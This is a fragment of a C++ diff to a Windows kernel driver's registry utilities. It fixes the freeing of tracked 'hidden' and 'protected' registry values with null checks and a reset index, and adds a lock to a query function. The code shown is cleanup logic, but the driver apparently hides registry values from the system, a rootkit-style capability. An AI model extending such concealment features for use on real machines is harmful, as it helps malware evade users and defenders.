-			this->ProtectedItems.Values.ValuesName[i] = nullptr;
+		for (ULONG i = 0; i <= this->ProtectedItems.Values.LastIndex; i++) {
+			if (this->ProtectedItems.Values.ValuesPath[i]) {
+				ExFreePoolWithTag(this->ProtectedItems.Values.ValuesPath[i], DRIVER_TAG);
+				this->ProtectedItems.Values.ValuesPath[i] = nullptr;
+			}
+
+			if (this->ProtectedItems.Values.ValuesName[i]) {
+				ExFreePoolWithTag(this->ProtectedItems.Values.ValuesName[i], DRIVER_TAG);
+				this->ProtectedItems.Values.ValuesName[i] = nullptr;
+			}
 		}
+
+		this->ProtectedItems.Values.LastIndex = 0;
 		this->ProtectedItems.Values.ValuesCount = 0;
 		break;
 	}
 	case RegHiddenValue:
 	{
-		for (ULONG i = 0; i < this->HiddenItems.Values.ValuesCount; i++) {
-			ExFreePoolWithTag(this->HiddenItems.Values.ValuesPath[i], DRIVER_TAG);
-			ExFreePoolWithTag(this->HiddenItems.Values.ValuesName[i], DRIVER_TAG);
-			this->HiddenItems.Values.ValuesPath[i] = nullptr;
-			this->HiddenItems.Values.ValuesName[i] = nullptr;
+		for (ULONG i = 0; i <= this->HiddenItems.Values.LastIndex; i++) {
+			if (this->HiddenItems.Values.ValuesPath[i]) {
+				ExFreePoolWithTag(this->HiddenItems.Values.ValuesPath[i], DRIVER_TAG);
+				this->HiddenItems.Values.ValuesPath[i] = nullptr;
+			}
+
+			if (this->HiddenItems.Values.ValuesName[i]) {
+				ExFreePoolWithTag(this->HiddenItems.Values.ValuesName[i], DRIVER_TAG);
+				this->HiddenItems.Values.ValuesName[i] = nullptr;
+			}
 		}
+
+		this->HiddenItems.Values.LastIndex = 0;
 		this->HiddenItems.Values.ValuesCount = 0;
 		break;
 	}
@@ -1001,6 +1230,7 @@ NTSTATUS RegistryUtils::QueryRegItem(RegItem* item) {
 	bool isFirstElement;
 	errno_t err = 0;
 	NTSTATUS status = STATUS_SUCCESS;
+	AutoLock locker(this->Lock);
 
 	isFirstElement = item->RegItemsIndex == 0;
 
